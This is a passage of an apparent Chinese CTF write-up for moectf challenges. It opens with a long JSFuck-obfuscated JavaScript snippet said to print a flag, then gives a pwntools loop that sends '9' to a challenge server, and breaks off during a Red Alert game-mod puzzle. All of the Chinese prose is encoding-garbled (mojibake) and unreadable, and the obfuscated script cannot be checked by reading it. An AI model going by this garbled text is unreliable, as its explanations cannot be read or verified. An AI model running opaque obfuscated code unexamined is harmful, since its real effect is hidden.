[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[+!+[]])+[])+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure><p>è™½ç„¶çœ‹èµ·æ¥æ€ªæ€ªçš„ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ­£å¸¸çš„jsè„šæœ¬</p><p>è¿ç”¨jsçš„ç‰¹æ€§ã€åªé€šè¿‡<code>[]()+!</code>å…­ä¸ªå­—ç¬¦è¿›è¡Œç¼–å†™çš„jsè„šæœ¬è¯­è¨€ç§°ä¹‹ä¸º<strong>JSFUCK</strong></p><p>ç›´æ¥å½“æˆå¸¸è§„çš„jsè„šæœ¬è¿è¡Œå³å¯å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/10/08/U9AtnyfguvRT8Mc.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;J5Fxck_1s_1nt3res7in9!&#125;</span><br></pre></td></tr></table></figure><h2 id="â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤"><a href="#â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤" class="headerlink" title="â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤"></a>â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤</h2><blockquote><p>æ³¨ï¼šæœ¬é¢˜å€Ÿé‰´äº†moectf2018çš„æŸé“miscé¢˜</p></blockquote><p>ncï¼Œè¿ä¸Šåå‘ç°é¢˜ç›®ä¼šç»™æˆ‘ä»¬å„ç§ä¸åŒçš„ä»£æ•°ç®—å¼è®©æˆ‘ä»¬è§£ç­”</p><p><img src="https://i.loli.net/2020/10/08/zvZ8fL4ajuQrgBR.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°æ— è®ºç®—å¼æ˜¯å•¥ï¼Œåªæœ‰å½“æˆ‘ä»¬è¾“å…¥å­—ç¬¦<code>9</code>çš„æ—¶å€™ç¨‹åºæ‰èƒ½ç»§ç»­è¿è¡Œä¸‹å»ï¼Œæ•…å°è¯•ä¸€ç›´è¾“å…¥<code>9</code></p><p>è¾“å…¥99æ¬¡åæˆ‘ä»¬ä¾¿å¾—åˆ°äº†flag</p><p><img src="https://i.loli.net/2020/10/08/s3OynaXBTk1hHEG.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;c1rn0_1s_tH3_5tr0n9est!&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼šæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨pythonè„šæœ¬è‡ªåŠ¨è¾“å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;sec.arttnba3.cn&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line">result = p.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">        result = p.recv()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/08/JtsWgfSHCvx2TkF.png" alt="image.png"></p></blockquote><h2 id="é—ª-ç”µ-é£-æš´"><a href="#é—ª-ç”µ-é£-æš´" class="headerlink" title="é—ª ç”µ é£ æš´"></a>é—ª ç”µ é£ æš´</h2><blockquote><p> ä¸€é“æ¯”è¾ƒç®€å•çš„æ¸¸æˆå®‰åˆ©é¢˜ï¼ˆç¡®ä¿¡</p></blockquote><p>é¢˜ç›®åç§°ä¸ºã€é—ªç”µé£æš´ã€‘ï¼Œé—ªç”µé£æš´æ˜¯çº¢è‰²è­¦æˆ’ä¸­ã€ç›Ÿå†›ã€‘é˜µè¥çš„è¶…çº§æ­¦å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨è¿™ä¸ªmodåŒ…ä¸­çš„ç›Ÿå†›å¹¶æ²¡æœ‰ã€å¤©æ°”æ§åˆ¶ä»ªã€‘ï¼Œä¹Ÿå°±æ— æ³•é‡Šæ”¾è¶…çº§æ­¦å™¨ã€é—ªç”µé£æš´ã€‘</p><p><img src="https://i.loli.net/2020/10/08/XfNGZtB9IwheKMW.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾çŒœåˆ°åªè¦æŠŠã€å¤©æ°”æ§åˆ¶ä»ªã€‘ä¿®æ”¹å‡ºæ¥ä¾¿å¯ä»¥å¾—åˆ°flag</p><p>ç™¾åº¦å¯ä»¥çŸ¥é“çº¢è­¦çš„è§„åˆ™æ–‡ä»¶ä¸º<code>rulesmd.ini</code>ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æˆ‘ä»¬åœ¨æ–‡ä»¶å¤¹ä¸‹å¹¶ä¸èƒ½å‘ç°è¿™ä¸ªæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/10/08/vLb9BGnxU6gXYFj.png" alt="image.png"></p><p><strong>å…è´¹çš„hint</strong> æç¤º<code>XCC MIXER</code>ï¼Œç™¾åº¦å¯ä»¥çŸ¥é“è¿™ä¸ªè½¯ä»¶æ˜¯ç”¨æ¥ä»åç¼€åä¸º<code>*.mix</code>çš„æ–‡ä»¶ä¸­æå–æ¸¸æˆèµ„æºæ–‡ä»¶çš„</p><p><img src="https://i.loli.net/2020/10/08/A6EFvSJ4iQpjaMs.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çœ‹åˆ°åŒ…å†…æœ‰å¾ˆå¤šçš„<code>*.mix</code>æ–‡ä»¶ï¼ŒçŒœæµ‹<code>rulesmd.ini</code>å¯èƒ½å­˜åœ¨äºå…¶ä¸­ä¸€ä¸ªå½“ä¸­</p><p><img src="https://i.loli.net/2020/10/08/vVABX38Ki6uLrme.png" alt="image.png"></p><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¼šå‘ç°ç›¸å½“ä¸€éƒ¨åˆ†çš„mixæ–‡ä»¶éƒ½æ— æ³•ä½¿ç”¨<code>XCC MIXER</code>æ‰“å¼€ï¼Œè€ƒè™‘åˆ°é¢˜ç›®æ–‡æœ¬ä¸­æœ‰å†™é“ï¼š</p><p><img src="https://i.loli.net/2020/10/08/5N9jnd8zmtfwOuE.png" alt="image.png"></p><p>æ•…å¯ä»¥å¾—çŸ¥å­˜æ”¾<code>rulesmd.ini</code>çš„mixæ–‡ä»¶åº”è¯¥æ˜¯è¢«åŠ å¯†äº†ï¼ŒåŒæ—¶ç”±äºæˆ‘ä»¬ä¸çŸ¥é“åŠ 